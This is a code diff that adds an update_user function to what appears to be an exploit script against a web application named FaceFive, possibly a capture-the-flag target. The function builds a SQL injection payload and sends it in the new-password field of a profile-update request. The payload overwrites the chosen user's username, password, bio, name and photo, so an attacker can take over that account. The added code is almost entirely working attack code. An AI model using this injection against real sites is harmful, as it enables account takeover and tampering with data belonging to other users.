@@ -115,5 +115,29 @@ def get_schema(session: FaceFiveSession, tables: str):
 
     return schema
 
+def update_user(session: FaceFiveSession, correct_password: str, username: str, password = None, about = None, name = None, photo = None):
+    sqli = '\', username=\'{}\''.format(username)
+    if password is not None: sqli += ', password=\'{}\''.format(password)
+    if about is not None: sqli += ', about=\'{}\''.format(about)
+    if name is not None: sqli += ', name=\'{}\''.format(name)
+    if photo is not None: sqli += ', photo=\'{}\''.format(photo)
+
+    assert sqli != '\', username=\'{}\''.format(username), 'Need some element to inject'
+    sqli += ' where username=\'{}\' -- '.format(username)
+    print(sqli)
+
+    files = {
+        'name': (None, ''),
+        'currentpassword': (None, correct_password),
+        'newpassword': (None, sqli),
+        'about': (None, 'None'),
+        'image': ('', ''),
+    }
+    r = session.post('update_profile', files=files)
+    preety_print_html(r.text)
+    assert r.status_code == 200, 'Failed to update password: ' + r.reason
+
+    return r
+
 def preety_print_html(html: str):
     print(_html2text.handle(html))
